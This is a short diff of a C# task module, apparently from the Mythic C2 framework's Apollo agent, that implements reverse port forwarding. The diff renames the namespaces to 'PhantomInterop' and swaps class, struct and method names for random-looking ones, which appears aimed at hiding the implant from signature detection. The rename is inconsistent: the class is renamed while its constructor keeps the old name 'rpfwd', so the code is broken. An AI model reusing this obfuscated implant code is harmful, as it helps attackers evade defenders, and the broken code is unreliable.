@@ -6,25 +6,25 @@
 
 #if RPFWD
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Net.Sockets;
 using System.Net;
 using System.Runtime.Serialization;
 using System;
-using ApolloInterop.Utils;
+using PhantomInterop.Utils;
 using System.Threading;
 
 namespace Tasks
 {
-    public class rpfwd : Tasking
+    public class PhantomHandler7B44 : Tasking
     {
         public rpfwd(IAgent agent, MythicTask data) : base(agent, data)
         {
         }
         [DataContract]
-        internal struct RpfwdParameters
+        internal struct FlexibleAdapter8581
         {
             [DataMember(Name = "port")] public int Port;
             [DataMember(Name = "action")] public string Action;
@@ -35,7 +35,7 @@ namespace Tasks
         private int _debugLevel;
        
         private Random _random = new Random((int) DateTime.UtcNow.Ticks);
-        private void OnClientConnected(IAsyncResult result)
+        private void IntelligentHandler739B(IAsyncResult result)
         {
             // complete connection
             try
